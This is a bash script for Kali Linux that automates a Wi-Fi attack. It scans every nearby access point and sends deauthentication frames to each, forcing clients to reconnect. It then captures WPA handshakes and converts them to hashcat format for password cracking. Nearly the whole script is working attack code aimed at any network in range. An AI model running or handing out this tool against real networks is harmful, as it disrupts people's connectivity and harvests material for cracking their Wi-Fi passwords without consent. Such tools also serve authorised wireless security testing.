#!/bin/bash

checkUtils() {
  echo "Check utils"
  if [ ! -f /bin/cap2hccapx ]; then
    echo "No cap2hccapx"
    echo "Please, install cap2hccapx:"
    echo "sudo apt install hcxtools"
    echo "sudo cp /usr/lib/hashcat-utils/cap2hccapx.bin /bin/cap2hccapx"
    exit 1
  fi
  
}

checkHandshakes() {
  echo "Check handshakes..."
  output=$(cap2hccapx /home/kali/shakes-01.cap /home/kali/cleanshakes.hccapx)
  echo $output
  if [[ "$output" == *"Written 0"* ]] || [[ "$output" == *"Networks detected: 0"* ]]; then
    echo "No handshakes"
    rm /home/kali/cleanshakes.hccapx >/dev/null
  else
    echo "Handshakes detected!!!"
    if [[ -d /home/kali/shakes ]]; then

      if [[ $(ls /home/kali/shakes/ | wc -l) -ne 0 ]]; then
        lastNum=$(($(head -n 1 /home/kali/shakes/.counter) + 1))
        mv /home/kali/cleanshakes.hccapx /home/kali/shakes/shake${lastNum}
        echo $lastNum >/home/kali/shakes/.counter
      else
        mv /home/kali/cleanshakes.hccapx /home/kali/shakes/shake1
        touch /home/kali/shakes/.counter
        echo "1" >/home/kali/shakes/.counter
      fi
    else
      mkdir /home/kali/shakes
      mv /home/kali/cleanshakes.hccapx /home/kali/shakes/shake1
      touch /home/kali/shakes/.counter
      echo "1" >/home/kali/shakes/.counter
    fi
  fi
  echo ""
}

active() {
  trap "rm /home/kali/sha* > /dev/null;rm /home/kali/cleanshakes.hccapx > /dev/null" EXIT
  airmon-ng check kill
  airmon-ng start wlan1
  echo "Collect APs..."
  timeout 15 airodump-ng -w /home/kali/shakesCollector wlan1 </dev/null >/dev/null
  counter=0

  while read line; do
    if [[ $counter -lt 2 ]]; then
      counter=$(($counter + 1))
      continue
    fi

    channel=$(echo $line | awk '{print $6}')
    channel=${channel::-1} #delete last ,
    bssid=$(echo $line | awk '{print $1}')
    bssid=${bssid::-1}
    echo $bssid
    echo $channel

    iwconfig wlan1 channel $channel
    timeout 30 airodump-ng --bssid $bssid -w /home/kali/shakes wlan1 </dev/null >/dev/null &
    aireplay-ng -a $bssid -0 10 wlan1
    sleep 10
    checkHandshakes
    rm /home/kali/shakes-* >/dev/null
  done </home/kali/shakesCollector-01.csv

}

passive() {
  trap 'checkHandshakes;rm /home/kali/shakes-*' EXIT

  airmon-ng check kill
  airmon-ng start wlan1

  echo "Start airodump.."
  airodump-ng -w /home/kali/shakes wlan1 </dev/null >/dev/null
}

if [ $# -lt 1 ]; then
  echo "Please use -a or -p flag"
  exit 1
fi
checkUtils
while getopts "pa" opt; do
  case $opt in
  a) active ;;
  p) passive ;;
  *) echo "Unknown option" ;;
  esac
done
